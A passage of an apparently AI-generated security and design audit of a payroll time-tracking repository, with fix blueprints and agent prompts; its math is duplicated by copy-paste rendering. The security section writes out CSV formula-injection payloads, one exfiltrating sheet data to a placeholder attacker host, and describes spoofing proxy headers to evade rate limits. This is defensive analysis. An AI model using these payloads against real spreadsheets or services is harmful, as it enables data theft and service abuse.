+            src/lib/shift-engine.ts derives the shift.   
+            teacherevan/j-pay
+
+            ctx.db.patch(shiftId, ...) or ctx.db.insert("shifts", ...) hits a transient 502 Bad Gateway, connection reset, or 23505 unique violation (0015_shifts_unique_user_started.sql).   
+            teacherevan/j-pay
+
+            Result: The raw punch is permanently committed in logs with its idempotency key consumed (0002_logs_idempotency_unique.sql), so retrying the idempotency key becomes a no-op (test-derivation-idempotent.mjs), leaving shifts permanently unclosed or missing.   
+            teacherevan/j-pay
+
+        Fix Specification: Stop executing multi-table mutations as chatty client-side PostgREST round-trips from Vercel functions. Move the critical write paths (recordPunchAndDeriveShift, toggleTravelLeg, applyShiftOverride) into atomic PostgreSQL PL/pgSQL BEGIN ... EXCEPTION ... END RPC functions called via supabase.rpc(), OR implement a Two-Phase Outbox table in Postgres where logs insert + shifts upsert occur inside a single SQL function.
+
+    [P0] Emulated ctx.db.get(id) / ctx.db.patch(id) Lacks Mandatory Composite (id, org_id) Enforcement (src/lib/backend/db.ts, convex/moderator.ts, convex/manager.ts, supabase/migrations/0009_organisations.sql)   
+    teacherevan/j-pay
+
+        Root Cause: src/lib/supabase/admin.ts uses the Supabase SERVICE_ROLE_KEY, which completely bypasses PostgreSQL Row-Level Security (RLS). Tenant isolation (ADR-005-multi-org-per-deployment.md) therefore depends 100% on application-level filters inside convex/*.ts (tested in scripts/test-org-isolation.mjs and scripts/test-manager-authz.mjs).   
+        teacherevan/j-pay+ 1
+
+        Failure Mode: While .query("table").withIndex("by_org", ...) filters by org_id, direct primary-key operations like ctx.db.get(targetId) and ctx.db.patch(targetId, patch) in src/lib/backend/db.ts lookup by UUID/ID alone. If any handler in convex/moderator.ts, convex/shifts.ts, or convex/sites.ts patches a record before asserting record.org_id === caller.org_id, a Moderator in Org A can mutate a shift, site, or employee in Org B via UUID guessing/enumeration.   
+        teacherevan/j-pay+ 1
+
+        Fix Specification: Instantiate db.ts with a mandatory boundOrgId: string | null inside src/lib/backend/runtime.ts. Force every get, patch, replace, and delete in db.ts on multi-tenant tables (users, sites, logs, shifts, travel_logs, shift_overrides, messages) to append .eq("org_id", this.boundOrgId) at the SQL builder level so cross-org mutation is structurally impossible even if a handler forgets the check.   
+        teacherevan/j-pay+ 1
+
+2. Financial, Accounting & Statutory Payroll Engineer (Domain Audit)
+
+    [P0] Absence of Double-Entry Payroll Ledger, Pay-Run Locking & Audit Trail Immutability (convex/payroll.ts, convex/payroll_data.ts, src/lib/payroll-strategies.ts, src/app/payroll.tsx)   
+    teacherevan/j-pay
+
+        Root Cause: Payroll is computed dynamically on-the-fly from mutable shifts and shift_overrides (0007_shift_overrides.sql) every time payroll.tsx queries convex/payroll.ts or exports CSV (src/lib/csv.ts). There is no payroll_runs, payslip_snapshots, or ledger_entries table in supabase/migrations/0001–0018.   
+        teacherevan/j-pay+ 1
+
+        Failure Mode:
+
+            Retroactive Mutation: If a manager or moderator edits a user's hourly_rate in users.ts, modifies a site's rules, or applies a shift_override after wages were paid for Week W
+            W, re-querying Week W
+            W produces different historical payroll numbers—violating basic accounting cut-off principles and statutory audit trails (SARS / Department of Employment and Labour BCEA Section 33 in South Africa; Labour Protection Act B.E. 2541 in Thailand).
+
+            No Adjustment Journal: Corrections overwrite state via 0007_shift_overrides.sql instead of posting an immutable credit/debit adjustment entry (delta_minutes, delta_pay_cents, reason_code, authorized_by).   
+            teacherevan/j-pay
+
+        Fix Specification: Introduce migration 0019_payroll_ledger_and_locks.sql containing:
+
+            pay_periods (id, org_id, iso_week, status: 'open' | 'locked' | 'paid', locked_at, locked_by, sha256_checksum).
+
+            Reject any punches, shifts, or shift_overrides mutation whose timestamp falls inside a 'locked' or 'paid' period unless entered as a forward-dated adjustment in the current open period.
+
+    [P1] Statutory Overtime, Sunday/Public Holiday Tiers & IEEE-754 Floating-Point Drift (src/lib/payroll-strategies.ts, src/lib/payroll-jurisdictions.ts, src/lib/iso-week.ts, scripts/test-payroll-rounding.mjs)   
+    teacherevan/j-pay
+
+        Root Cause: payroll-strategies.ts and payroll-jurisdictions.ts calculate pay using JavaScript number (64-bit float) hours multiplied by hourly rates, with rounding tested in test-payroll-rounding.mjs.   
+        teacherevan/j-pay
+
+        Failure Mode:
+
+            Banker's Rounding vs. Cumulative Cent Drift: Calculating Math.round(hours * rate * 100) / 100 per shift vs. summing exact integer minutes across the ISO week and multiplying once at period close produces discrepancies up to ±0.05
+            ±0.05 currency units per employee per week (0.1 + 0.2 === 0.30000000000000004).
+
+            Statutory Cap & Tier Violations: Under South African BCEA (Basic Conditions of Employment Act), ordinary hours cap at 45 hrs/week (9 hrs/day for 5-day workers, 8 hrs/day for >5
+            >5-day workers), overtime is capped at 10 hrs/week (3 hrs/day) at 1.5×
+            1.5×, and Sundays/Public Holidays require 1.5×
+            1.5× (if ordinarily worked) or 2.0×
+            2.0×. Under Thai Labour Protection Act, normal hours cap at 8 hrs/day (48 hrs/week), weekday OT is 1.5×
+            1.5×, holiday normal hours are 1.0×
+            1.0× (salaried) / 2.0×
+            2.0× (hourly), and holiday OT is 3.0×
+            3.0×. Without a public_holidays calendar table or daily-vs-weekly bucket priority, payroll-strategies.ts misclassifies holiday overtime.   
+            teacherevan/j-pay
+
+        Fix Specification: Convert all internal payroll math to integer milliminutes (or integer seconds) and integer minor currency units (cents/satang) using BigInt or safe integer arithmetic:
+        Paycents=⌊WorkedSeconds×HourlyRatecents×Multiplierbps+180000003600×10000⌋
+        Paycents​=⌊3600×10000WorkedSeconds×HourlyRatecents​×Multiplierbps​+18000000​⌋
+
+        where Multiplierbps∈{10000(1.0×),15000(1.5×),20000(2.0×),30000(3.0×)}
+        Multiplierbps​∈{10000(1.0×),15000(1.5×),20000(2.0×),30000(3.0×)}.
+
+3. Security and Trust Boundary Engineer (AppSec & Exploit Vectors)
+
+    [P0] CSV Formula Injection (DDE / Spreadsheet Execution) in Payroll & Audit Exports (src/lib/csv.ts, src/app/payroll.tsx, src/app/moderator/audit-view.tsx, scripts/test-csv.mjs)   
+    teacherevan/j-pay
+
+        Root Cause: src/lib/csv.ts escapes quotes and commas (verified in scripts/test-csv.mjs), but employee names, site names, message bodies (convex/messages.ts), or shift override reasons starting with =, +, -, @, \t (0x09), or \r (0x0D) are emitted raw into CSV cells.   
+        teacherevan/j-pay
+
+        Failure Mode: A malicious user or compromised account sets their display name or override note to =cmd|'/C calc'!A0 or =IMPORTXML(CONCAT("[http://attacker.tld/](http://attacker.tld/)", A1:Z100), "//a"). When the payroll accountant or Moderator opens the exported CSV in Microsoft Excel or Google Sheets, arbitrary formulas execute or exfiltrate the entire payroll sheet.
+
+        Fix Specification: In src/lib/csv.ts, prefix any string cell matching /^[=+\-@\t\r]/ with a single quote (') or tab before quoting, and add an assertion in scripts/test-csv.mjs.   
+        teacherevan/j-pay
+
+    [P0] Rate-Limit Bucket Bypass Behind Proxy Headers & Serverless Cold Starts (supabase/migrations/0013_rate_limit_buckets.sql, 0016_rate_limit_fn_lockdown.sql, src/app/api/backend/call/route.ts, src/app/api/auth/session-bootstrap/route.ts)   
+    teacherevan/j-pay
+
+        Root Cause: Rate limiting relies on PostgreSQL bucket functions (0013_rate_limit_buckets.sql, locked down in 0016_rate_limit_fn_lockdown.sql) keyed by client identifier/IP.   
+        teacherevan/j-pay
+
+        Failure Mode:
+
+            If the rate-limit key extracts IP from x-forwarded-for by taking the first IP (split(',')[0]) instead of the Vercel-trusted x-real-ip or rightmost trusted hop, an attacker rotates X-Forwarded-For: 1.2.3.X on every request to bypass 0013_rate_limit_buckets.sql completely.   
+            teacherevan/j-pay
+
+            Every unauthenticated flood request to /api/backend/call or /api/auth/session-bootstrap still wakes a Vercel function and burns a database connection to run the rate-limit SQL check, enabling Connection Pool Exhaustion DoS on Supabase.   
+            teacherevan/j-pay
+
+        Fix Specification: Key IP rate limits strictly on req.headers.get('x-real-ip') (on Vercel) combined with the authenticated user.id, and reject malformed/unauthenticated /api/backend/call requests at the edge (src/proxy.ts) before touching Postgres.   
+        teacherevan/j-pay
+
+4. Algorithmic, Geodesic & Physics Engineer (Spatial & Temporal Math)
+
+    [P1] Haversine Geofence Multipath GPS Bounce & Urban Canyon False Rejections (convex/geo.ts, src/app/check-in/geoposition.ts, src/app/moderator/geofence-modal.tsx, scripts/test-geo.mjs)   
+    teacherevan/j-pay
+
+        Root Cause: convex/geo.ts computes point-to-point Haversine distance d
+        d against a static site radius R
+        R, without weighting the device's reported horizontal accuracy radius σacc
+        σacc​ (coords.accuracy in meters from geoposition.ts).   
+        teacherevan/j-pay
+
+        Failure Mode:
+
+            False Negatives (Worker Lockout): Inside metal-roofed warehouses or urban canyons (e.g., Johannesburg CBD or Bangkok concrete sites), mobile GPS frequently reports σacc∈[60m,150m]
+            σacc​∈[60m,150m]. A worker standing physically inside a 50m
+            50m geofence is rejected because the raw centroid bounced 65m
+            65m away.
+
+            False Positives (Confidence Spoofing): Conversely, if you naively subtract coords.accuracy, an attacker spoofing accuracy: 50000 can check in from 50 km away.
+
+        Fix Specification: Implement Clamped Uncertainty Buffer Scoring in convex/geo.ts:
+           
+        teacherevan/j-pay
+        deffective=dhaversine(Puser,Psite)−min⁡(σacc,σmax⁡)
+        deffective​=dhaversine​(Puser​,Psite​)−min(σacc​,σmax​)
+
+        where σmax⁡=min⁡(35m,0.5×Rsite)
+        σmax​=min(35m,0.5×Rsite​), and hard-reject any fix where σacc>150m
+        σacc​>150m with a specific UI prompt ("GPS signal too weak (±" + Math.round(acc) + "m). Step near a window or outdoors.").
+
+    [P1] Unbounded Travel Leg & Impossible Velocity Teleportation (convex/travel.ts, src/lib/travel-window.ts, supabase/migrations/0006_travel_tracking.sql, 0010_travel_open_leg_unique.sql, scripts/test-travel-window-bounds.mjs)   
+    teacherevan/j-pay
+
+        Root Cause: 0010_travel_open_leg_unique.sql enforces at most one open travel leg per user, and travel-window.ts bounds maximum duration. However, consecutive geospatial punches (Site A Check-Out →
+        → Travel Start →
+        → Travel End →
+        → Site B Check-In) are not validated for kinematic feasibility.   
+        teacherevan/j-pay+ 1
+
+        Failure Mode: Two punches separated by Δt=120s
+        Δt=120s across sites 40km
+        40km apart (v=333 m/s≈Mach 1
+        v=333 m/s≈Mach 1) are accepted if both coordinates lie inside their respective site geofences (e.g., credential sharing between two phones logged into the same employee account across two sites).
+
+        Fix Specification: Compute kinematic velocity v=ΔdΔt
+        v=ΔtΔd​ between consecutive user events in punches.ts and travel.ts. Flag any transition with v>45 m/s
+        v>45 m/s (162 km/h
+        162 km/h) and Δd>1000m
+        Δd>1000m as anomaly: 'IMPOSSIBLE_TRAVEL' in 0011_system_events.sql.   
+        teacherevan/j-pay+ 1
+
+5. Psychological & Human-Factors Engineer (Field Crew & Moderator UX)
+
+    [P1] Ambiguous Offline Outbox State Induces "Rage-Tapping" & Trust Erosion in Field Workers (src/app/check-in-card.tsx, src/app/check-in/StatusChips.tsx, src/app/check-in/ShiftTimer.tsx, src/app/use-outbox.ts)   
+    teacherevan/j-pay
+
+        Root Cause: From a behavioral psychology standpoint (Operant Conditioning / Immediate Feedback Loops), hourly workers experience high anxiety when punching in/out because wage loss is directly tied to missed punches. When offline, use-outbox.ts queues the punch locally, while test-checkin-busy-latch.mjs prevents double-clicking during in-flight network requests.   
+        teacherevan/j-pay
+
+        Failure Mode: If the network hangs for 8000ms (up to the transport timeout in test-transport-timeout.mjs) before falling back to the offline outbox, the worker stares at a busy spinner while walking through a security gate, leading to app-kill/refresh or distrust of whether the punch was recorded.   
+        teacherevan/j-pay
+
+        Fix Specification: Switch to Optimistic-First Outbox Commit (<150ms Perceived Latency):
+
+            Immediately persist the punch with its client UUID idempotency key to safe-storage.ts / outbox.ts in <15ms
+            <15ms and transition StatusChips.tsx + ShiftTimer.tsx to "Recorded on Device • Syncing..." with tactile haptic feedback (navigator.vibrate?.(40)).   
+            teacherevan/j-pay
+
+            Attempt background sync with a tight 3500ms timeout per attempt, upgrading the badge to "Verified by Server ✓" once 200 OK returns.
+
+    [P2] Moderator Vigilance Decrement & Choice Overload Across 18 Console Sub-Views (src/app/moderator/page.tsx, live-view.tsx, crew-view.tsx, audit-view.tsx, access-view.tsx, employee-drawer.tsx, shift-overrides-panel.tsx)   
+    teacherevan/j-pay
+
+        Root Cause: In human-factors psychology (Mackworth's Vigilance Decrement & Hick's Law), monitoring a live table/map of normal shifts (live-view.tsx, crew-view.tsx) causes operators to miss the 2%
+        2% of anomalous shifts (unclosed shifts >12h
+        >12h, geofence edge-punches, repeated outbox clock drift, unverified travel legs).   
+        teacherevan/j-pay
+
+        Failure Mode: Moderators must manually hunt through crew-view.tsx, employee-drawer.tsx, and audit-view.tsx across paginated tables (use-pagination.ts) to find payroll blockers before payday.   
+        teacherevan/j-pay
+
+        Fix Specification: Add an "Exceptions & Action Required (N)" triage filter chip at the top of kpi-banner.tsx / live-view.tsx that surfaces only actionable anomalies (Open Shift >10h
+        >10h, Pending Override, Outbox Drift >15m
+        >15m, Unassigned Site Manager) sorted by financial impact.   
+        teacherevan/j-pay
+
+6. Concurrency and State Engineer (Client-Server Desync)
+
+    [P1] Stale Query Resolution Overwriting Post-Mutation Cache in Custom React Adapter (src/lib/backend/react.ts, scripts/test-react-adapter-dedup.mjs, scripts/test-use-query-loop.mjs)   
+    teacherevan/j-pay
+
+        Root Cause: src/lib/backend/react.ts deduplicates identical in-flight queries (verified by test-react-adapter-dedup.mjs and test-react-adapter-dedup-worker.mjs). However, when a useMutation executes while a slow useQuery request (Q1
+        Q1​) is already in flight, Q1
+        Q1​ can resolve after the mutation finishes and overwrite the cache with pre-mutation data.   
+        teacherevan/j-pay
+
+        Failure Mode: A user punches in (useMutation succeeds), the UI briefly updates, and 200ms later an in-flight background poll (Q1
+        Q1​) resolves with the old status: "checked_out" payload, snapping check-in-card.tsx back to Checked Out.   
+        teacherevan/j-pay
+
+        Fix Specification: Stamp every query request and cache entry in src/lib/backend/react.ts with a monotonically increasing mutationEpoch integer. Increment mutationEpoch++ at the start and completion of every mutation; drop any query response whose requestEpoch < currentMutationEpoch.   
+        teacherevan/j-pay
+
+3. Test Suite Audit & Real-vs-Stub Coverage Matrix
+
+You have 34 custom .mjs test scripts in scripts/ plus 2 Python consistency checkers (check_consistency.py, check_diagrams.py). Here is why bugs still slip past scripts/run-gate.mjs:   
+teacherevan/j-pay
+Test Script Group	What It Actually Tests	Critical Blind Spot (Why It Gives False Confidence)
+
+test-db-adapter.mjs, test-write-set.mjs, test-runtime-modules.mjs
+teacherevan/j-pay
+	
+
+Emulated ctx.db calls against scripts/lib/db-stub.mjs & postgrest-stub.mjs
+teacherevan/j-pay
+	
+
+Zero SQL Engine Fidelity: postgrest-stub.mjs is an in-memory JS array filter. It never tests partial unique indexes (0010, 0015), Postgres transaction rollbacks, or PostgREST URL-length limits on large .in() arrays.
+teacherevan/j-pay+ 1
+
+test-org-isolation.mjs, test-manager-authz.mjs, test-list-orgs.mjs
+teacherevan/j-pay
+	
+
+Handler-level org filtering on list/query paths
+teacherevan/j-pay
+	
+
+Direct-ID Mutation Gap: Does not systematically fuzz every patch/delete mutation across moderator.ts and shifts.ts using a valid Org A session token paired with a raw primary key (shiftId, siteId, overrideId) belonging to Org B.
+teacherevan/j-pay
+
+test-shift-engine.mjs, test-shift-engine-fuzz.mjs, test-shift-derivation-bounds.mjs
+teacherevan/j-pay
+	
+
+Pure shift pairing & boundary math (ADR-003)
+teacherevan/j-pay
+	
+
+Mid-Derivation Crash Recovery: Tests pure functions (src/lib/shift-engine.ts) in isolation, not what happens when punches.ts commits a log row to Supabase and the serverless container dies before shifts is updated.
+teacherevan/j-pay
+
+test-payroll-strategies.mjs, test-payroll-rounding.mjs, test-payroll-jurisdictions.mjs
+teacherevan/j-pay
+	
+
+Rate calculation & rounding helpers
+teacherevan/j-pay
+	Retroactive Rate Mutation: Does not test whether changing a user's pay rate today alters historical closed weeks' payroll totals.
+
+test-outbox.mjs, test-checkin-busy-latch.mjs
+teacherevan/j-pay
+	
+
+Outbox queue storage & UI button busy latch
+teacherevan/j-pay
+	
+
+Cross-Subsystem Race: Tests outbox.ts and live-submit.tsx separately; does not test the window.ononline auto-flush firing at the exact millisecond the user taps Check In.
+teacherevan/j-pay
+4. Top 5 High-Leverage Surgical Refactoring Blueprints
+Blueprint 1: Tenant-Scoped Database Wrapper (src/lib/backend/db.ts)
+
+Eliminate cross-organization IDOR vulnerabilities structurally by binding orgId into the database adapter rather than trusting 19 separate handler files in convex/*.ts.   
+teacherevan/j-pay
+TypeScript
+
+// TARGET PATTERN for src/lib/backend/db.ts
+const TENANT_SCOPED_TABLES = new Set([
+  "users", "sites", "logs", "shifts", "travel_logs",
+  "shift_overrides", "messages", "manager_sites"
+]);
+
+export class ScopedSupabaseDb {
+  constructor(
+    private readonly client: SupabaseClient,
+    private readonly callerOrgId: string | null,
+    private readonly isSuperModerator: boolean = false
+  ) {}
+
+  private enforceTenantFilter<T extends { eq: (col: string, val: string) => T }>(
+    table: string,
+    queryBuilder: T
+  ): T {
+    if (TENANT_SCOPED_TABLES.has(table) && this.callerOrgId && !this.isSuperModerator) {
+      return queryBuilder.eq("org_id", this.callerOrgId);
+    }
+    return queryBuilder;
+  }
+
+  async patch(table: string, id: string, values: Record<string, unknown>) {
+    // Prevents Org A from ever patching an ID owned by Org B
+    let q = this.client.from(table).update(values).eq("id", id);
+    q = this.enforceTenantFilter(table, q);
+    const { data, error } = await q.select().single();
+    if (error || !data) throw new Error(`UNAUTHORIZED_OR_MISSING_RECORD: ${table}:${id}`);
+    return data;
+  }
+}
+
+Blueprint 2: Atomic Punch + Shift Derivation PostgreSQL RPC (supabase/migrations/0019_atomic_punch_rpc.sql)
+
+Replace multi-round-trip PostgREST writes in convex/punches.ts with a single ACID PostgreSQL transaction so a punch log and its shift state can never desynchronize.   
+teacherevan/j-pay
+SQL
+
+-- TARGET PATTERN: supabase/migrations/0019_atomic_punch_rpc.sql
+CREATE OR REPLACE FUNCTION public.commit_punch_and_upsert_shift(
+  p_org_id UUID,
+  p_user_id UUID,
+  p_site_id UUID,
+  p_idempotency_key TEXT,
+  p_punch_type TEXT,
+  p_punched_at TIMESTAMPTZ,
+  p_lat DOUBLE PRECISION,
+  p_lng DOUBLE PRECISION,
+  p_shift_started_at TIMESTAMPTZ,
+  p_shift_ended_at TIMESTAMPTZ,
+  p_duration_minutes INTEGER
+) RETURNS JSONB
+LANGUAGE plpgsql
+SECURITY DEFINER
+SET search_path = public
+AS $$
+DECLARE
+  v_log_id UUID;
+  v_shift_id UUID;
+BEGIN
+  -- 1. Idempotent log insert (0002_logs_idempotency_unique.sql)
+  INSERT INTO public.logs (org_id, user_id, site_id, idempotency_key, type, timestamp, lat, lng)
+  VALUES (p_org_id, p_user_id, p_site_id, p_idempotency_key, p_punch_type, p_punched_at, p_lat, p_lng)
+  ON CONFLICT (user_id, idempotency_key) DO UPDATE SET idempotency_key = EXCLUDED.idempotency_key
+  RETURNING id INTO v_log_id;
+
+  -- 2. Atomic shift upsert within the exact same database transaction (0015_shifts_unique_user_started.sql)
+  IF p_shift_started_at IS NOT NULL THEN
+    INSERT INTO public.shifts (org_id, user_id, site_id, started_at, ended_at, duration_minutes)
+    VALUES (p_org_id, p_user_id, p_site_id, p_shift_started_at, p_shift_ended_at, p_duration_minutes)
+    ON CONFLICT (user_id, started_at)
+    DO UPDATE SET
+      ended_at = COALESCE(EXCLUDED.ended_at, public.shifts.ended_at),
+      duration_minutes = COALESCE(EXCLUDED.duration_minutes, public.shifts.duration_minutes),
+      updated_at = NOW()
+    RETURNING id INTO v_shift_id;
+  END IF;
+
+  RETURN jsonb_build_object('log_id', v_log_id, 'shift_id', v_shift_id);
+END;
+$$;
+
+REVOKE ALL ON FUNCTION public.commit_punch_and_upsert_shift FROM PUBLIC, anon, authenticated;
+GRANT EXECUTE ON FUNCTION public.commit_punch_and_upsert_shift TO service_role;
+
+Blueprint 3: Monotonic Mutation Epoch in src/lib/backend/react.ts
+
+Prevent slow in-flight polling responses from overwriting fresh post-mutation state on mobile networks.   
+teacherevan/j-pay
+TypeScript
+
+// TARGET PATTERN for src/lib/backend/react.ts
+let mutationEpoch = 0;
+
+export function bumpMutationEpoch(): number {
+  return ++mutationEpoch;
+}
+
+export function getMutationEpoch(): number {
+  return mutationEpoch;
+}
+
+// Inside useQuery fetcher:
+const startEpoch = getMutationEpoch();
+const result = await executeTransportCall(fnRef, args, signal);
+if (startEpoch !== getMutationEpoch()) {
+  // Discard: a mutation started or completed while this query was in flight
+  return;
+}
+
+Blueprint 4: CSV Formula Injection Hardening (src/lib/csv.ts)
+
+Block spreadsheet DDE/formula execution in exported payroll and audit logs.   
+teacherevan/j-pay
+TypeScript
+
+// TARGET PATTERN for src/lib/csv.ts
+const FORMULA_TRIGGER_RE = /^[=+\-@\t\r]/;
+
+export function escapeCsvCell(raw: unknown): string {
+  if (raw === null || raw === undefined) return "";
+  let str = String(raw);
+  if (FORMULA_TRIGGER_RE.test(str)) {
+    str = `'${str}`; // Neutralize spreadsheet formula evaluation
+  }
+  if (/[",\r\n]/.test(str)) {
+    return `"${str.replace(/"/g, '""')}"`;
+  }
+  return str;
+}
+
+Blueprint 5: Repository De-Bloat & Single-Source Agent Skills
+
+Remove the 31 duplicate convex-* skill directories in .claude/skills/ and .agents/skills/ that bloat context and confuse coding agents into writing Convex code for a Supabase backend.   
+teacherevan/j-pay
+Bash
+
+# Run once locally to eliminate 62 redundant skill folders & symlink a single source of truth
+rm -rf .claude/skills/convex* .agents/skills/convex*
+ln -s ../.agents/skills .claude/skills
+
+5. Copy-Paste Agent Remediation Prompts
+
+Feed these directly into your coding agent (Roo / Kilo / CLine / Hermes) in sequence:
+
+    Prompt 1 (Fix P0 — Atomic Outbox/Live Lock & Mutation Epoch Guard):
+    "1. In src/lib/backend/react.ts, add a module-scoped let mutationEpoch = 0 counter. Increment mutationEpoch both immediately before and immediately after every mutation execution in useMutation. In useQuery, capture const startEpoch = mutationEpoch before firing the /api/backend/call fetch, and if startEpoch !== mutationEpoch when the response resolves, discard the stale response without updating the cache or component state, and immediately trigger a fresh refetch.
+    2. In src/lib/outbox.ts, export a concurrency mutex withPunchSyncLock<T>(fn: () => Promise<T>): Promise<T>. Wrap both the outbox flush loop in src/app/use-outbox.ts and the live punch submission in src/app/check-in/live-submit.tsx inside withPunchSyncLock.
+    3. Add regression tests in scripts/test-react-adapter-dedup.mjs and scripts/test-checkin-busy-latch.mjs."
+
+    Prompt 2 (Fix P0 — Enforce Tenant-Scoped Patch/Delete in db.ts & CSV Formula Sanitization):
+    "1. In src/lib/backend/db.ts, inspect all get, patch, replace, and delete methods. Add an optional boundOrgId context parameter so that any single-row lookup or mutation against multi-tenant tables (users, sites, logs, shifts, travel_logs, shift_overrides, messages) appends .eq('org_id', boundOrgId) whenever boundOrgId is present. Add a negative cross-org IDOR test in scripts/test-org-isolation.mjs verifying that patching a shift ID belonging to Org B while bound to Org A throws an error.
+    2. In src/lib/csv.ts, prefix any string cell matching /^[=+\-@\t\r]/ with a leading single quote (') before CSV quoting to prevent spreadsheet formula injection. Add test cases in scripts/test-csv.mjs for =1+1, +cmd, -2+3, and @SUM(A1:A2)."
+
+    Prompt 3 (Fix P1 — Integer Minor-Unit Payroll Math & GPS Uncertainty Clamping):
+    "1. In src/lib/payroll-strategies.ts, eliminate floating-point drift by converting shift durations to integer seconds/minutes and hourly rates to integer minor units (cents/satang) before applying overtime tier multipliers in basis points (10000 = 1.0x, 15000 = 1.5x, 20000 = 2.0x), rounding only at the final step. Verify against scripts/test-payroll-rounding.mjs and scripts/test-payroll-strategies.mjs.
+    2. In convex/geo.ts, update the geofence check helper to accept an optional accuracyMeters?: number parameter. Reject fixes with accuracyMeters > 150, and otherwise subtract Math.min(accuracyMeters ?? 0, Math.min(35, radiusMeters * 0.5)) from the Haversine distance before comparing against radiusMeters. Add boundary tests in scripts/test-geo.mjs."
+
+Which of these three remediation tracks—1. Concurrency & RPC Atomicity, 2. Multi-Tenant & CSV AppSec Hardening, or 3. Statutory Payroll Ledger & Geodesic Math—do you want to execute first?
+
+
+Gemini is AI and can make mistakes.
+
